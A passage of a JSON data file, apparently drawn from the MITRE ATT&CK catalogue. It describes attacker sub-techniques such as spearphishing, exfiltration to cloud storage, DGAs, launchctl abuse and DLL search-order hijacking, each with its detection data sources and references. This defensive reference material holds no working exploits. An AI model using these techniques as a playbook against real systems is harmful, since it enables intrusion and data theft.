        "description": "decalage2. (2019, December 3). python-oletools. Retrieved September 18, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--1cfcb312-b8d7-47a4-b560-4b16cc677292",
    "platform": "linux|macos|windows",
    "tid": "T1565.001",
    "technique": "Stored Data Manipulation",
    "tactic": "impact",
    "datasources": "application-logs|file-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.<!-- raw HTML omitted --><!-- raw HTML omitted -->Stored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.</p>\n",
    "technique_references": [
      {
        "source_name": "FireEye APT38 Oct 2018",
        "url": "https://content.fireeye.com/apt/rpt-apt38",
        "description": "FireEye. (2018, October 03). APT38: Un-usual Suspects. Retrieved November 6, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "DOJ Lazarus Sony 2018",
        "url": "https://www.justice.gov/opa/press-release/file/1092091/download",
        "description": "Department of Justice. (2018, September 6). Criminal Complaint - United States of America v. PARK JIN HYOK. Retrieved March 29, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--d0613359-5781-4fd2-b5be-c269270be1f6",
    "platform": "linux|macos|windows",
    "tid": "T1565.002",
    "technique": "Transmitted Data Manipulation",
    "tactic": "impact",
    "datasources": "network-protocol-analysis|packet-capture",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making.<!-- raw HTML omitted --><!-- raw HTML omitted -->Manipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.</p>\n",
    "technique_references": [
      {
        "source_name": "FireEye APT38 Oct 2018",
        "url": "https://content.fireeye.com/apt/rpt-apt38",
        "description": "FireEye. (2018, October 03). APT38: Un-usual Suspects. Retrieved November 6, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "DOJ Lazarus Sony 2018",
        "url": "https://www.justice.gov/opa/press-release/file/1092091/download",
        "description": "Department of Justice. (2018, September 6). Criminal Complaint - United States of America v. PARK JIN HYOK. Retrieved March 29, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--32ad5c86-2bcf-47d8-8fdc-d7f3d79a7490",
    "platform": "linux|macos|windows",
    "tid": "T1565.003",
    "technique": "Runtime Data Manipulation",
    "tactic": "impact",
    "datasources": "file-monitoring|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may modify systems in order to manipulate the data as it is accessed and displayed to an end user.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating runtime data, adversaries may attempt to affect a business process, organizational understanding, and decision making.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may alter application binaries used to display data in order to cause runtime manipulations. Adversaries may also conduct <a href=\"https://attack.mitre.org/techniques/T1546/001\">Change Default File Association</a> and <a href=\"https://attack.mitre.org/techniques/T1036\">Masquerading</a> to cause a similar effect. The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.</p>\n",
    "technique_references": [
      {
        "source_name": "FireEye APT38 Oct 2018",
        "url": "https://content.fireeye.com/apt/rpt-apt38",
        "description": "FireEye. (2018, October 03). APT38: Un-usual Suspects. Retrieved November 6, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "DOJ Lazarus Sony 2018",
        "url": "https://www.justice.gov/opa/press-release/file/1092091/download",
        "description": "Department of Justice. (2018, September 6). Criminal Complaint - United States of America v. PARK JIN HYOK. Retrieved March 29, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--2e34237d-8574-43f6-aace-ae2915de8597",
    "platform": "macos|windows|linux",
    "tid": "T1566.001",
    "technique": "Spearphishing Attachment",
    "tactic": "initial-access",
    "datasources": "detonation-chamber|email-gateway|file-monitoring|mail-server|network-intrusion-detection-system|packet-capture",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon <a href=\"https://attack.mitre.org/techniques/T1204\">User Execution</a> to gain execution.<!-- raw HTML omitted --><!-- raw HTML omitted -->There are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary’s payload exploits a vulnerability or directly executes on the user’s system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/163.html",
        "description": "none",
        "external_id": "CAPEC-163"
      }
    ]
  },
  {
    "id": "attack-pattern--2b742742-28c3-4e1b-bab7-8350d6300fa7",
    "platform": "linux|macos|windows|office-365|saas",
    "tid": "T1566.002",
    "technique": "Spearphishing Link",
    "tactic": "initial-access",
    "datasources": "detonation-chamber|dns-records|email-gateway|mail-server|packet-capture|ssl-tls-inspection|web-proxy",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. <!-- raw HTML omitted --><!-- raw HTML omitted -->All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging <a href=\"https://attack.mitre.org/techniques/T1204\">User Execution</a>. The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Links may also direct users to malicious applications  designed to <a href=\"https://attack.mitre.org/techniques/T1528\">Steal Application Access Token</a>s, like OAuth tokens, in order to gain access to protected applications and information.(Citation: Trend Micro Pawn Storm OAuth 2017)</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/163.html",
        "description": "none",
        "external_id": "CAPEC-163"
      },
      {
        "source_name": "Trend Micro Pawn Storm OAuth 2017",
        "url": "https://blog.trendmicro.com/trendlabs-security-intelligence/pawn-storm-abuses-open-authentication-advanced-social-engineering-attacks",
        "description": "Hacquebord, F.. (2017, April 25). Pawn Storm Abuses Open Authentication in Advanced Social Engineering Attacks. Retrieved October 4, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--f6ad61ee-65f3-4bd0-a3f5-2f0accb36317",
    "platform": "linux|macos|windows",
    "tid": "T1566.003",
    "technique": "Spearphishing via Service",
    "tactic": "initial-access",
    "datasources": "anti-virus|ssl-tls-inspection|web-proxy",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may send spearphishing messages via third-party services in an attempt to gain access to victim systems. Spearphishing via service is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of third party services rather than directly via enterprise email channels. <!-- raw HTML omitted --><!-- raw HTML omitted -->All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services. These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target’s interest in some way. Adversaries will create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and software that’s running in an environment. The adversary can then send malicious links or attachments through these services.<!-- raw HTML omitted --><!-- raw HTML omitted -->A common example is to build rapport with a target via social media, then send content to a personal webmail service that the target uses on their work computer. This allows an adversary to bypass some email restrictions on the work account, and the target is more likely to open the file since it’s something they were expecting. If the payload doesn’t work as expected, the adversary can continue normal communications and troubleshoot with the target on how to get it working.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/163.html",
        "description": "none",
        "external_id": "CAPEC-163"
      }
    ]
  },
  {
    "id": "attack-pattern--86a96bf6-cf8b-411c-aaeb-8959944d64f7",
    "platform": "linux|macos|windows",
    "tid": "T1567.001",
    "technique": "Exfiltration to Code Repository",
    "tactic": "exfiltration",
    "datasources": "netflow-enclave-netflow|network-protocol-analysis|packet-capture|process-monitoring|process-use-of-network|ssl-tls-inspection",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may exfiltrate data to a code repository rather than over their primary command and control channel. Code repositories are often accessible via an API (ex: https://api.github.com). Access to these APIs are often over HTTPS, which gives the adversary an additional level of protection.<!-- raw HTML omitted --><!-- raw HTML omitted -->Exfiltration to a code repository can also provide a significant amount of cover to the adversary if it is a popular service already used by hosts within the network.</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--bf1b6176-597c-4600-bfcd-ac989670f96b",
    "platform": "linux|macos|windows",
    "tid": "T1567.002",
    "technique": "Exfiltration to Cloud Storage",
    "tactic": "exfiltration",
    "datasources": "netflow-enclave-netflow|network-protocol-analysis|packet-capture|process-monitoring|process-use-of-network|ssl-tls-inspection",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.<!-- raw HTML omitted --><!-- raw HTML omitted -->Examples of cloud storage services include Dropbox and Google Docs. Exfiltration to these cloud storage services can provide a significant amount of cover to the adversary if hosts within the network are already communicating with the service.</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--29ba5a15-3b7b-4732-b817-65ea8f6468e6",
    "platform": "linux|macos|windows",
    "tid": "T1568.001",
    "technique": "Fast Flux DNS",
    "tactic": "command-and-control",
    "datasources": "dns-records",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use Fast Flux DNS to hide a command and control channel behind an array of rapidly changing IP addresses linked to a single domain resolution. This technique uses a fully qualified domain name, with multiple IP addresses assigned to it which are swapped with high frequency, using a combination of round robin IP addressing and short Time-To-Live (TTL) for a DNS resource record.(Citation: MehtaFastFluxPt1)(Citation: MehtaFastFluxPt2)(Citation: Fast Flux - Welivesecurity)<!-- raw HTML omitted --><!-- raw HTML omitted -->The simplest, “single-flux” method, involves registering and de-registering an addresses as part of the DNS A (address) record list for a single DNS name. These registrations have a five-minute average lifespan, resulting in a constant shuffle of IP address resolution.(Citation: Fast Flux - Welivesecurity)<!-- raw HTML omitted --><!-- raw HTML omitted -->In contrast, the “double-flux” method registers and de-registers an address as part of the DNS Name Server record list for the DNS zone, providing additional resilience for the connection. With double-flux additional hosts can act as a proxy to the C2 host, further insulating the true source of the C2 channel.</p>\n",
    "technique_references": [
      {
        "source_name": "MehtaFastFluxPt1",
        "url": "https://resources.infosecinstitute.com/fast-flux-networks-working-detection-part-1/#gref",
        "description": "Mehta, L. (2014, December 17). Fast Flux Networks Working and Detection, Part 1. Retrieved March 6, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "MehtaFastFluxPt2",
        "url": "https://resources.infosecinstitute.com/fast-flux-networks-working-detection-part-2/#gref",
        "description": "Mehta, L. (2014, December 23). Fast Flux Networks Working and Detection, Part 2. Retrieved March 6, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Fast Flux - Welivesecurity",
        "url": "https://www.welivesecurity.com/2017/01/12/fast-flux-networks-work/",
        "description": "Albors, Josep. (2017, January 12). Fast Flux networks: What are they and how do they work?. Retrieved March 11, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--118f61a5-eb3e-4fb6-931f-2096647f4ecd",
    "platform": "linux|macos|windows",
    "tid": "T1568.002",
    "technique": "Domain Generation Algorithms",
    "tactic": "command-and-control",
    "datasources": "dns-records|netflow-enclave-netflow|network-device-logs|packet-capture|process-use-of-network",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination domain for command and control traffic rather than relying on a list of static IP addresses or domains. This has the advantage of making it much harder for defenders block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Unit 42 DGA Feb 2019)<!-- raw HTML omitted --><!-- raw HTML omitted -->DGAs can take the form of apparently random or “gibberish” strings (ex: istgmxdejdnxuyla.ru) when they construct domain names by generating each letter. Alternatively, some DGAs employ whole words as the unit by concatenating words together instead of letters (ex: cityjulydish.net). Many DGAs are time-based, generating a different domain for each time period (hourly, daily, monthly, etc). Others incorporate a seed value as well to make predicting future domains more difficult for defenders.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Talos CCleanup 2017)(Citation: Akamai DGA Mitigation)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may use DGAs for the purpose of <a href=\"https://attack.mitre.org/techniques/T1008\">Fallback Channels</a>. When contact is lost with the primary command and control server malware may employ a DGA as a means to reestablishing command and control.(Citation: Talos CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit 2017 Activity)</p>\n",
    "technique_references": [
      {
        "source_name": "Cybereason Dissecting DGAs",
        "url": "http://go.cybereason.com/rs/996-YZT-709/images/Cybereason-Lab-Analysis-Dissecting-DGAs-Eight-Real-World-DGA-Variants.pdf",
        "description": "Sternfeld, U. (2016). Dissecting Domain Generation Algorithms: Eight Real World DGA Variants. Retrieved February 18, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Cisco Umbrella DGA",
        "url": "https://umbrella.cisco.com/blog/2016/10/10/domain-generation-algorithms-effective/",
        "description": "Scarfo, A. (2016, October 10). Domain Generation Algorithms – Why so effective?. Retrieved February 18, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Unit 42 DGA Feb 2019",
        "url": "https://unit42.paloaltonetworks.com/threat-brief-understanding-domain-generation-algorithms-dga/",
        "description": "Unit 42. (2019, February 7). Threat Brief: Understanding Domain Generation Algorithms (DGA). Retrieved February 19, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Talos CCleanup 2017",
        "url": "http://blog.talosintelligence.com/2017/09/avast-distributes-malware.html",
        "description": "Brumaghin, E. et al. (2017, September 18). CCleanup: A Vast Number of Machines at Risk. Retrieved March 9, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Akamai DGA Mitigation",
        "url": "https://blogs.akamai.com/2018/01/a-death-match-of-domain-generation-algorithms.html",
        "description": "Liu, H. and Yuzifovich, Y. (2018, January 9). A Death Match of Domain Generation Algorithms. Retrieved February 18, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye POSHSPY April 2017",
        "url": "https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html",
        "description": "Dunwoody, M.. (2017, April 3). Dissecting One of APT29’s Fileless WMI and PowerShell Backdoors (POSHSPY). Retrieved April 5, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "ESET Sednit 2017 Activity",
        "url": "https://www.welivesecurity.com/2017/12/21/sednit-update-fancy-bear-spent-year/",
        "description": "ESET. (2017, December 21). Sednit update: How Fancy Bear Spent the Year. Retrieved February 18, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Data Driven Security DGA",
        "url": "https://datadrivensecurity.info/blog/posts/2014/Oct/dga-part2/",
        "description": "Jacobs, J. (2014, October 2). Building a DGA Classifier: Part 2, Feature Engineering. Retrieved February 18, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Pace University Detecting DGA May 2017",
        "url": "http://csis.pace.edu/~ctappert/srd2017/2017PDF/d4.pdf",
        "description": "Chen, L., Wang, T.. (2017, May 5). Detecting Algorithmically Generated Domains Using Data Visualization and N-Grams Methods . Retrieved April 26, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Endgame Predicting DGA",
        "url": "https://arxiv.org/pdf/1611.00791.pdf",
        "description": "Ahuja, A., Anderson, H., Grant, D., Woodbridge, J.. (2016, November 2). Predicting Domain Generation Algorithms with Long Short-Term Memory Networks. Retrieved April 26, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--83a766f8-1501-4b3a-a2de-2e2849e8dfc1",
    "platform": "linux|macos|windows",
    "tid": "T1568.003",
    "technique": "DNS Calculation",
    "tactic": "command-and-control",
    "datasources": "dns-records",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may perform calculations on addresses returned in DNS results to determine which port and IP address to use for command and control, rather than relying on a predetermined port number or the actual returned IP address. A IP and/or port number calculation can be used to bypass egress filtering on a C2 channel.(Citation: Meyers Numbered Panda)<!-- raw HTML omitted --><!-- raw HTML omitted -->One implementation of <a href=\"https://attack.mitre.org/techniques/T1568/003\">DNS Calculation</a> is to take the first three octets of an IP address in a DNS response and use those values to calculate the port for command and control traffic.(Citation: Meyers Numbered Panda)(Citation: Moran 2014)(Citation: Rapid7G20Espionage)</p>\n",
    "technique_references": [
      {
        "source_name": "Meyers Numbered Panda",
        "url": "http://www.crowdstrike.com/blog/whois-numbered-panda/",
        "description": "Meyers, A. (2013, March 29). Whois Numbered Panda. Retrieved January 14, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Moran 2014",
        "url": "https://www.fireeye.com/blog/threat-research/2014/09/darwins-favorite-apt-group-2.html",
        "description": "Moran, N., Oppenheim, M., Engle, S., & Wartell, R.. (2014, September 3). Darwin’s Favorite APT Group &#91;Blog&#93;. Retrieved November 12, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "Rapid7G20Espionage",
        "url": "https://blog.rapid7.com/2013/08/26/upcoming-g20-summit-fuels-espionage-operations/",
        "description": "Rapid7. (2013, August 26). Upcoming G20 Summit Fuels Espionage Operations. Retrieved March 6, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--810aa4ad-61c9-49cb-993f-daa06199421d",
    "platform": "macos",
    "tid": "T1569.001",
    "technique": "Launchctl",
    "tactic": "execution",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse launchctl to execute commands or programs. Launchctl controls the macOS launchd process, which handles things like <a href=\"https://attack.mitre.org/techniques/T1543/001\">Launch Agent</a>s and <a href=\"https://attack.mitre.org/techniques/T1543/004\">Launch Daemon</a>s, but can execute other commands or programs itself. Launchctl supports taking subcommands on the command-line, interactively, or even redirected from standard input.(Citation: Launchctl Man)<!-- raw HTML omitted --><!-- raw HTML omitted -->By loading or reloading <a href=\"https://attack.mitre.org/techniques/T1543/001\">Launch Agent</a>s or <a href=\"https://attack.mitre.org/techniques/T1543/004\">Launch Daemon</a>s, adversaries can install persistence or execute changes they made.(Citation: Sofacy Komplex Trojan)<!-- raw HTML omitted --><!-- raw HTML omitted -->Running a command from launchctl is as simple as <!-- raw HTML omitted -->launchctl submit -l <!-- raw HTML omitted --> – /Path/to/thing/to/execute “arg” “arg” “arg”<!-- raw HTML omitted -->. Adversaries can abuse this functionality to execute code or even bypass application control if launchctl is an allowed process.</p>\n",
    "technique_references": [
      {
        "source_name": "Launchctl Man",
        "url": "https://ss64.com/osx/launchctl.html",
        "description": "SS64. (n.d.). launchctl. Retrieved March 28, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Sofacy Komplex Trojan",
        "url": "https://researchcenter.paloaltonetworks.com/2016/09/unit42-sofacys-komplex-os-x-trojan/",
        "description": "Dani Creus, Tyler Halfpop, Robert Falcone. (2016, September 26). Sofacy's 'Komplex' OS X Trojan. Retrieved July 8, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--f1951e8a-500e-4a26-8803-76d95c4554b4",
    "platform": "windows",
    "tid": "T1569.002",
    "technique": "Service Execution",
    "tactic": "execution",
    "datasources": "process-command-line-parameters|process-monitoring|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (<!-- raw HTML omitted -->services.exe<!-- raw HTML omitted -->) is an interface to manage and manipulate services.(Citation: Microsoft Service Control Manager) The service control manager is accessible to users via GUI components as well as system utilities such as <!-- raw HTML omitted -->sc.exe<!-- raw HTML omitted --> and <a href=\"https://attack.mitre.org/software/S0039\">Net</a>.<!-- raw HTML omitted --><!-- raw HTML omitted --><a href=\"https://attack.mitre.org/software/S0029\">PsExec</a> can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API.(Citation: Russinovich Sysinternals)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with <a href=\"https://attack.mitre.org/techniques/T1543/003\">Windows Service</a> during service persistence or privilege escalation.</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft Service Control Manager",
        "url": "https://docs.microsoft.com/windows/win32/services/service-control-manager",
        "description": "Microsoft. (2018, May 31). Service Control Manager. Retrieved March 28, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Russinovich Sysinternals",
        "url": "https://technet.microsoft.com/en-us/sysinternals/bb897553.aspx",
        "description": "Russinovich, M. (2014, May 2). Windows Sysinternals PsExec v2.11. Retrieved May 13, 2015.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--24bfaeba-cb0d-4525-b3dc-507c77ecec41",
    "platform": "linux|windows|macos",
    "tid": "T1573.001",
    "technique": "Symmetric Cryptography",
    "tactic": "command-and-control",
    "datasources": "malware-reverse-engineering|netflow-enclave-netflow|packet-capture|process-monitoring|process-use-of-network|ssl-tls-inspection",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.</p>\n",
    "technique_references": [
      {
        "source_name": "University of Birmingham C2",
        "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf",
        "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--bf176076-b789-408e-8cba-7275e81c0ada",
    "platform": "linux|macos|windows",
    "tid": "T1573.002",
    "technique": "Asymmetric Cryptography",
    "tactic": "command-and-control",
    "datasources": "malware-reverse-engineering|netflow-enclave-netflow|packet-capture|process-monitoring|process-use-of-network",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Asymmetric cryptography, also known as public key cryptography, uses a keypair per party: one public that can be freely distributed, and one private. Due to how the keys are generated, the sender encrypts data with the receiver’s public key and the receiver decrypts the data with their private key. This ensures that only the intended recipient can read the encrypted data. Common public key encryption algorithms include RSA and ElGamal.<!-- raw HTML omitted --><!-- raw HTML omitted -->For efficiency, may protocols (including SSL/TLS) use symmetric cryptography once a connection is established, but use asymmetric cryptography to establish or transmit a key. As such, these protocols are classified as <a href=\"https://attack.mitre.org/techniques/T1573/002\">Asymmetric Cryptography</a>.</p>\n",
    "technique_references": [
      {
        "source_name": "SANS Decrypting SSL",
        "url": "http://www.sans.org/reading-room/whitepapers/analyst/finding-hidden-threats-decrypting-ssl-34840",
        "description": "Butler, M. (2013, November). Finding Hidden Threats by Decrypting SSL. Retrieved April 5, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "SEI SSL Inspection Risks",
        "url": "https://insights.sei.cmu.edu/cert/2015/03/the-risks-of-ssl-inspection.html",
        "description": "Dormann, W. (2015, March 13). The Risks of SSL Inspection. Retrieved April 5, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "University of Birmingham C2",
        "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf",
        "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--2fee9321-3e71-4cf4-af24-d4d40d355b34",
    "platform": "windows",
    "tid": "T1574.001",
    "technique": "DLL Search Order Hijacking",
    "tactic": "persistence",
    "datasources": "dll-monitoring|file-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program. (Citation: Microsoft Dynamic Link Library Search Order) Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.<!-- raw HTML omitted --><!-- raw HTML omitted -->There are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks, (Citation: OWASP Binary Planting) by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program. Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. (Citation: Microsoft Security Advisory 2269637)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may also directly modify the way a program loads DLLs by replacing an existing DLL or modifying a .manifest or .local redirection file, directory, or junction to cause the program to load a different DLL. (Citation: Microsoft 